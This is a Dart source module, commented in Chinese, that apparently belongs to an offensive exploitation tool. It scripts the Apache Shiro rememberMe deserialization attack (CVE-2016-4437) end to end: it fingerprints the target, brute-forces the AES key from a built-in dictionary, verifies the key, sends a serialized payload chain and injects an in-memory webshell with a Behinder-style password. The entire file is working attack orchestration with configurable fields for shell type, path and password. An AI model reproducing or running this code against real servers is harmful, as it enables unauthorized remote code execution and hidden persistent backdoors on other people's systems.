/// Shiro 家族声明 + 流程步骤。
///
/// 步骤与迁移前的 `shiro_exp.dart` 一一对应：
/// 指纹 → 爆破 Key → 验证 Key → 发送 Payload → 注入内存马。
/// 步骤只做编排，真正的攻击逻辑仍在 `ShiroExpService` / `ShiroMemShellService`。
library;

import 'dart:convert';

import '../core/exp_step.dart';
import '../core/exploit_module.dart';
import '../core/exp_spec.dart';
import '../core/exploit_error.dart';
import '../shiro/shiro_crypto.dart';
import '../shiro/shiro_exp_service.dart';
import '../shiro/shiro_mem_shell_service.dart';
import '../shiro/shiro_payload_repo.dart';

/// 步骤内复用的连接参数（与模块层同一套规则）。
ShiroExpService _svc(StepContext ctx) {
  final method = (ctx.field('method') ?? '').trim();
  final cookie = (ctx.field('cookieName') ?? '').trim();
  return ShiroExpService(
    url: ctx.target.url,
    method: method.isEmpty ? 'GET' : method.toUpperCase(),
    cookieName: cookie.isEmpty ? 'rememberMe' : cookie,
    timeout: ctx.target.timeout,
  );
}

ShiroEncryptionMode _mode(StepContext ctx) =>
    (ctx.field('mode') ?? 'cbc') == 'gcm'
        ? ShiroEncryptionMode.gcm
        : ShiroEncryptionMode.cbc;

Future<List<int>> _payload(StepContext ctx) async {
  final custom = (ctx.field('payload') ?? '').trim();
  if (custom.isNotEmpty) {
    return base64Decode(custom.replaceAll(RegExp(r'\s'), ''));
  }
  return const ShiroPayloadRepo().loadPayload('shiro_payload_principal.b64');
}

final List<ExpStep> shiroSteps = [
  ExpStep(
    id: 'shiro.fingerprint',
    title: '1 · 指纹识别',
    description: '发一次请求，看响应里有没有 rememberMe=deleteMe',
    run: (ctx) async {
      final ok = await _svc(ctx).checkIsShiro();
      return ok
          ? const StepResult.ok('目标是 Shiro（响应含 rememberMe=deleteMe）')
          : const StepResult.failed('未发现 Shiro 特征（可能不是 Shiro 或未启用 rememberMe）');
    },
  ),
  ExpStep(
    id: 'shiro.bruteforce',
    title: '2 · 爆破 Key',
    description: '用内置字典逐条尝试；命中后写回「rememberMe key」字段',
    produces: const ['key'],
    writesField: 'key',
    run: (ctx) async {
      final repo = const ShiroPayloadRepo();
      final keys = await repo.loadKeys();
      if (keys.isEmpty) return const StepResult.failed('内置字典为空');
      final payload = await _payload(ctx);
      ctx.log('[i] 字典 ${keys.length} 个 key，模式 ${_mode(ctx).name.toUpperCase()}');
      final key = await _svc(ctx).bruteForceKey(
        candidateKeysBase64: keys,
        serializedPayload: payload,
        mode: _mode(ctx),
        verbose: (ctx.field('verbose') ?? 'false') == 'true',
        onProgress: ctx.log,
      );
      if (key == null) return const StepResult.failed('字典内没有可用 key');
      return StepResult.ok('命中 key：$key', {'key': key});
    },
  ),
  ExpStep(
    id: 'shiro.verify',
    title: '3 · 验证 Key',
    description: '确认这个 key 能让 deleteMe 消失（真伪判据）',
    requires: const ['key'],
    isProbe: true,
    run: (ctx) async {
      final key = (ctx.artifact('key') ?? ctx.field('key') ?? '').trim();
      if (key.isEmpty) return const StepResult.failed('没有可用 key');
      final ok = await _svc(ctx).verifyKey(
        keyBase64: key,
        serializedPayload: await _payload(ctx),
        mode: _mode(ctx),
        onProgress: ctx.log,
      );
      return ok
          ? StepResult.ok('key 可伪造 rememberMe', {'key': key})
          : const StepResult.failed('key 无效（deleteMe 未下降）');
    },
  ),
  ExpStep(
    id: 'shiro.sendPayload',
    title: '4 · 发送 Payload',
    description: '用当前 key 发一次自定义序列化链（默认内置 principal 链）',
    requires: const ['key'],
    run: (ctx) async {
      final key = (ctx.artifact('key') ?? ctx.field('key') ?? '').trim();
      if (key.isEmpty) return const StepResult.failed('没有可用 key');
      final result = await _svc(ctx).sendExploitOnce(
        keyBase64: key,
        serializedPayload: await _payload(ctx),
        mode: _mode(ctx),
        compareWithBaseline: true,
        onProgress: ctx.log,
      );
      return result.likelySuccess
          ? const StepResult.ok('Payload 可能已执行（deleteMe 下降）')
          : const StepResult.failed('Payload 可能未执行（deleteMe 未下降）');
    },
  ),
  ExpStep(
    id: 'shiro.inject',
    title: '5 · 注入内存马',
    description: 'Filter / Valve / Listener，可自定义路径与冰蝎密码',
    requires: const ['key'],
    produces: const ['shellUrl', 'shellPassword'],
    run: (ctx) async {
      final key = (ctx.artifact('key') ?? ctx.field('key') ?? '').trim();
      if (key.isEmpty) return const StepResult.failed('没有可用 key');
      final token = DateTime.now().millisecondsSinceEpoch.toRadixString(16);
      final rawPassword = (ctx.field('shellPassword') ?? '').trim();
      final password = rawPassword.isNotEmpty ? rawPassword : 'mx$token';
      final rawPath = (ctx.field('shellPath') ?? '').trim();
      final path = rawPath.isNotEmpty
          ? (rawPath.startsWith('/') ? rawPath : '/$rawPath')
          : '/mx$token.ico';
      final type = switch ((ctx.field('memshell') ?? '').trim()) {
        'valve' => MemShellType.valve,
        'listener' => MemShellType.listener,
        _ => MemShellType.filter,
      };
      final bytes = await const ShiroMemShellService().buildShellClass(
        type: type,
        password: password,
        path: path,
      );
      final result = await const ShiroMemShellService().inject(
        targetUrl: ctx.target.url,
        keyBase64: key,
        shellClassBytes: bytes,
        shellPath: path,
        shellPassword: password,
        mode: _mode(ctx),
        cookieName: (ctx.field('cookieName') ?? '').trim().isEmpty
            ? 'rememberMe'
            : ctx.field('cookieName')!.trim(),
        timeout: ctx.target.timeout,
      );
      if (!result.success) {
        throw const ExploitNotWorking('内存马注入被拒绝（目标未反序列化或链路不匹配）');
      }
      final base = Uri.parse(ctx.target.url);
      final shellUrl = base.replace(path: path, query: null).toString();
      ctx.log('[+] 内存马已注入：$shellUrl  密码：$password（${type.displayName}）');
      return StepResult.ok(
        '已注入 ${type.displayName}：$shellUrl  密码 $password',
        {'shellUrl': shellUrl, 'shellPassword': password},
        ShellSession(
          url: shellUrl,
          password: password,
          kind: 'memshell',
          connectorType: 'jsp_behinder',
          type: 'jsp',
          method: 'POST',
          note: 'Shiro ${type.displayName}，key=$key',
        ),
      );
    },
  ),
];

final shiroSpec = ExpSpec(
  id: 'shiro',
  family: 'Shiro',
  title: 'Shiro rememberMe 反序列化',
  subtitle: 'CVE-2016-4437 · 指纹 → 爆破 → 验证 → 注入',
  category: 'Shiro',
  icon: ExpIcon.shiro,
  notes: [
    '第 3 步「验证 Key」才是漏洞判据（指纹只说明目标用了 Shiro）',
    '内存马没有命令执行接口，需要通过 WebShell 连接器操作',
  ],
  fields: [
    ExpFieldSpec(
      key: 'method',
      label: '请求方法',
      type: ExpFieldType.select,
      defaultValue: 'GET',
      options: [
        ExpFieldOption('GET', 'GET'),
        ExpFieldOption('POST', 'POST'),
      ],
    ),
    ExpFieldSpec(
      key: 'mode',
      label: '加密模式',
      type: ExpFieldType.select,
      defaultValue: 'cbc',
      options: [
        ExpFieldOption('cbc', 'AES-CBC（≤1.4.1 默认）'),
        ExpFieldOption('gcm', 'AES-GCM（1.4.2+ 默认）'),
      ],
    ),
    ExpFieldSpec(key: 'cookieName', label: 'Cookie 名', defaultValue: 'rememberMe'),
    ExpFieldSpec(key: 'key', label: 'rememberMe key (base64)', defaultValue: ''),
    ExpFieldSpec(
      key: 'payload',
      label: 'Payload Base64',
      type: ExpFieldType.textarea,
      hint: '留空用内置链',
      defaultValue: '',
    ),
    ExpFieldSpec(
      key: 'memshell',
      label: '内存马类型',
      type: ExpFieldType.select,
      defaultValue: 'filter',
      options: [
        ExpFieldOption('filter', 'Filter 型'),
        ExpFieldOption('valve', 'Valve 型'),
        ExpFieldOption('listener', 'Listener 型'),
      ],
    ),
    ExpFieldSpec(key: 'shellPassword', label: '冰蝎密码（16 位 HEX）', defaultValue: ''),
    ExpFieldSpec(key: 'shellPath', label: 'Shell 路径', defaultValue: ''),
    ExpFieldSpec(
      key: 'verbose',
      label: '详细日志',
      type: ExpFieldType.toggle,
      defaultValue: 'false',
    ),
  ],
  variants: [
    ExpVariant(
      id: 'shiro-2016-4437',
      label: 'rememberMe 爆破 + 内存马 · CVE-2016-4437',
      moduleId: 'shiro-2016-4437',
      capabilities: {ExploitCapability.check, ExploitCapability.getShell},
    ),
  ],
  steps: shiroSteps,
);
